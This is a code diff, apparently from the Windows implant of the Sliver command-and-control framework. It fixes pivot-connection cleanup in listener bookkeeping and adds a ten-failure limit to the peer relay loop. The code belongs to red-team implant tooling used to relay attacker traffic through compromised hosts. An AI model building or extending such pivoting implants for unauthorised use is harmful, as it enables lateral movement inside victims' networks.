@@ -334,7 +334,33 @@ VOID FreePivotConnection
 	_In_ PPIVOT_CONNECTION pConnection
 )
 {
+	PPIVOT_LISTENER pListener = NULL;
+	DWORD i = 0;
+	DWORD j = 0;
+	PPIVOT_CONNECTION pTemp = NULL;
+
 	if (pConnection != NULL) {
+		pListener = pConnection->pListener;
+		if (pListener != NULL) {
+			EnterCriticalSection(&pListener->Lock);
+			for (i = 0; i < pListener->dwNumberOfConnections; i++) {
+				pTemp = pListener->Connections[i];
+				if (pConnection->uDownstreamPeerID == pTemp->uDownstreamPeerID) {
+					for (j = i; j < pListener->dwNumberOfConnections - 1; j++) {
+						pListener->Connections[j] = pListener->Connections[j + 1];
+					}
+
+					pListener->dwNumberOfConnections--;
+					if (pListener->dwNumberOfConnections == 0) {
+						FREE(pListener->Connections);
+						pListener->Connections = NULL;
+					}
+				}
+			}
+
+			LeaveCriticalSection(&pListener->Lock);
+		}
+
 		FREE(pConnection->lpRemoteAddress);
 		FREE(pConnection);
 	}
@@ -402,6 +428,7 @@ VOID PivotConnectionStart
 	PPIVOT_PEER_ENVELOPE pPeerEnvelope = NULL;
 	PPIVOT_PEER pNewPeer = NULL;
 	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
+	DWORD dwNumberOfFailure = 0;
 
 	if (!PeerKeyExchange(pConnection)) {
 		goto CLEANUP;
@@ -424,6 +451,10 @@ VOID PivotConnectionStart
 			goto CLEANUP;
 		}
 
+		if (dwNumberOfFailure >= 10) {
+			goto CLEANUP;
+		}
+
 		if (pEnvelope != NULL) {
 			FreeEnvelope(pEnvelope);
 			pEnvelope = NULL;
@@ -431,6 +462,7 @@ VOID PivotConnectionStart
 
 		pEnvelope = ReadEnvelopeFromPeer(pConnection);
 		if (pEnvelope == NULL) {
+			dwNumberOfFailure++;
 			continue;
 		}
 
@@ -439,7 +471,12 @@ VOID PivotConnectionStart
 			pSendEnvelope->uType = MsgPivotPeerPing;
 			pSendEnvelope->pData = pEnvelope->pData;
 			pEnvelope->pData = NULL;
-			WriteEnvelopeToPeer(pConnection, pSendEnvelope);
+			if (!WriteEnvelopeToPeer(pConnection, pSendEnvelope)) {
+				dwNumberOfFailure++;
+				FreeEnvelope(pSendEnvelope);
+				continue;
+			}
+
 			FreeEnvelope(pSendEnvelope);
 			//= MarshalEnvelope()
 		}
